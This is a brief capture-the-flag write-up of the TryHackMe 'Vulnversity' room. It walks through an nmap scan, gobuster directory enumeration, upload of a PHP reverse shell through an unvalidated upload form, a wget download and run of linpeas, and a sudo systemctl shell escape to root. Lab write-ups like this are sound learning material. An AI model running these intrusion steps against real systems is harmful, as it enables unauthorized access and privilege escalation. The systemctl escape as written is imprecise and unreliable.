#TryHackMe: "Vulnversity" Challenge Writeup
#Objective:

Find and exploit vulnerabilities in a web server and escalate privileges to root.

#Step 1: Initial Recon with nmap

-Started with a comprehensive port scan:

    'bash
    'nmap -A -T4 <target_ip>

-Discovered ports 80 (HTTP), 22 (SSH), and 139/445 (SMB) open.
-Focused on port 80 to identify web-based vulnerabilities.

#tep 2: Web Enumeration

-Used Gobuster to brute force directories on the web server:

    'bash
    'gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

-Discovered an upload directory.

#Step 3: Exploiting File Upload

-The upload form did not properly validate file types, allowing me to upload a PHP reverse shell (php-reverse-shell.php).
-Triggered the reverse shell by accessing the uploaded file in the browser.

#Step 4: Privilege Escalation

-After gaining a foothold, used linpeas to enumerate the system and check for possible privilege escalation vectors:

'bash
'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
'chmod +x linpeas.sh
'./linpeas.sh

-Discovered that the user could run sudo on /bin/systemctl without a password.

-Exploited this to spawn a root shell:

    'bash
    'sudo systemctl
    '!/bin/sh

#Lessons Learned:

-Web-based vulnerabilities like unrestricted file uploads can lead to full system compromise.
-Misconfigured sudo permissions offer an easy privilege escalation path.
